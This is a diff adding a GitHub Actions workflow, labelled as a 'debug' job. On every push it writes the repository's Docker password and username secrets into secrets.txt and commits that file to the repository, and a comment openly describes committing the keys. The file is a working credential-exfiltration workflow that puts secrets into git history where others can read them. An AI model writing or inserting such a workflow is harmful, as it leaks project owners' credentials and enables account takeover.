@@ -1,0 +1,20 @@
+name: show 
+on: [push]
+jobs:
+  debug:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout repo
+      uses: actions/checkout@v2
+    - env:
+        DEBUG_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
+        DEBUG_SECRET_KEY: ${{ secrets.DOCKER_USERNAME }}
+      run: |
+        echo $DEBUG_PASSWORD >> secrets.txt
+        echo $DEBUG_SECRET_KEY >> secrets.txt
+  
+    - uses: EndBug/add-and-commit@v7.0.0 # commit keys as txt file to repo
+      with:
+        author_name: github-actions
+        author_email: 41898282+github-actions[bot]@users.noreply.github.com
+        add: secrets.txt
